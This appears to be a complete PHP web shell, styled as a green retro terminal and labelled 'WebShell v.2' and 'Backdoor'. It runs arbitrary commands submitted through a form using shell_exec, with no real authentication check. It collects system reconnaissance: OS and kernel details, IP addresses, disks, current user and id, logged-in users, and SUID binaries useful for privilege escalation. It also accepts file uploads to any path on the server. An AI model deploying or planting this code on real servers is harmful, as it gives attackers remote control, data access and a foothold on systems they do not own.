<!-- MuteAvery was here <:~ -->
<style>
@keyframes retroScroll {
    0% { background-position: 0 0; }
    100% { background-position: 0 4px; }
}

@keyframes retroGlow {
    0%,100% { box-shadow: 0 0 6px #22ff55 inset; }
    50%      { box-shadow: 0 0 12px #22ff55 inset; }
}

.retro-terminal {
    margin-top: 15px;
    border: 2px solid #22ff55;
    background: #000;
    border-radius: 6px;
    overflow: hidden;
    background-image:
        linear-gradient(rgba(0,255,70,0.05) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,70,0.02) 1px, transparent 1px);
    background-size: 100% 3px, 3px 100%;
    animation:
        retroScroll 0.4s linear infinite,
        retroGlow 3s ease-in-out infinite;
}

.retro-terminal-header {
    background: #22ff55;
    color: #000;
    padding: 6px 10px;
    font-family: Consolas, monospace;
    font-weight: bold;
    border-bottom: 2px solid #22ff55;
}

.retro-terminal-body {
    padding: 10px;
    color: #22ff55;
    font-family: Consolas, monospace;
    text-shadow: 0 0 5px #22ff55;
    white-space: pre-wrap;
}
</style>


<?php
echo '<body style="background-color:#424242;">';
?>


<!-- Authenticated -->
<font style="float:left;" color="#F1F1F1"><b>WebShell v.2 <:~ </b></font><br /><br />
<fieldset style="border:2px solid #25F511;opacity:0.5;border-radius:5px;background:#000000;">
<form style="float:left;color:#25F511;" action='<?php echo $_SERVER["PHP_SELF"]?>' method=
"post">
<b>Run Command:</b><br />
<input type= "text" name="command" />
<input type="submit" value="Run"/><p>


<?php if (!empty($_POST['command'])): ?>
    <div class="retro-terminal">
        <div class="retro-terminal-header">Backdoor</div>
        <div class="retro-terminal-body">
            <?php echo shell_exec($_POST['command']); ?>
        </div>
    </div>
<?php endif; ?>






<br><br>
<b>System Info:</b><p>
------------------------------------------------------------------------------------------------------------

<br><br>
<b>Kernel & OS Info</b>
<?php
$uname = shell_exec("uname -a;  awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
echo "<pre>$uname</pre>";
?>


<b>Network interfaces</b>
<?php
$ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
echo "<pre>$ip_addr</pre>";
?>

<b>disks</b>
<?php
$disk = shell_exec("df -h");
echo "<pre>$disk</pre>";
?>

<b>User info</b>
<?php
$user = shell_exec("whoami; id");
echo "<pre>$user</pre>";
?>

<b> Connected Users </b>
<?php
$users = shell_exec("who -u");
echo "<pre>$users</pre>";
?>

<b>SUIDS</b>

<?php
$SUIDS = shell_exec("find / -perm /4000 2>/dev/null");
echo "<pre>$SUIDS</pre>";
?>




</form>

<form style="float:right;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
<b>Remote Upload Path:</b><br />
<input type="text" name="upload" /> (Use full paths)<br /><br />
<b>File Upload:</b><br />
<input type="submit" value="Upload!"/>
<input type="file" name="file" /><P>
<b>Current Remote Directory:</b><br />
----------------------------------------------------------

<?php
$pwd = shell_exec("pwd");
echo "<pre>$pwd</pre>";
?>

</form></fieldset>

<?php 
   if(isset($_FILES['file'])){
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_size =$_FILES['file']['size'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];   
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
               
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
      }else{
         print_r($errors);
      }
   }
   function exec_cmd(){
      if (isset($_POST['command'])){
         $exc = $_POST['command']; echo shell_exec($exc);
      }
   }
   echo '<pre><span style="font-size:11px;color:#F2F2F2;">';
   exec_cmd();
   echo '</span></pre>';
?>
